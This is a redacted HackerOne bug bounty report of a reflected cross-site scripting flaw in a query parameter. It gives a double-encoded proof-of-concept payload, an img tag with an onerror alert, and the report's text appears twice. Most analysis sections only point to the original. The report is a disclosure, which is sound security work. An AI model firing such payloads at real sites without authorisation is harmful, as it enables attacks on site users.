# Reflected XSS at ████ via ██████████= parameter 

## Metadata
- **Source:** HackerOne
- **Report:** 1305472 | https://hackerone.com/reports/1305472
- **Submitted:** 2021-08-14
- **Reporter:** zhenwarx
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Hi
I found that this endpoint is vulnerable with Reflected XSS, The ███= parameter is vulnerable with RXSS
PoC:
```
██████████?████████=%253Cimg/src/onerror=alert(document.domain)%253E

```
Payload: `<img/src/onerror=alert(document.domain)> `
Regards

## Impact

RXSS

## System Host(s)
www.███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
██████████?█████=%253Cimg

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi
I found that this endpoint is vulnerable with Reflected XSS, The ███= parameter is vulnerable with RXSS
PoC:
```
██████████?████████=%253Cimg/src/onerror=alert(document.domain)%253E

```
Payload: `<img/src/onerror=alert(document.domain)> `
Regards

## Impact

RXSS

## System Host(s)
www.███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
██████████?█████=%253Cimg/src/onerror=alert(document.domain)%253E

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
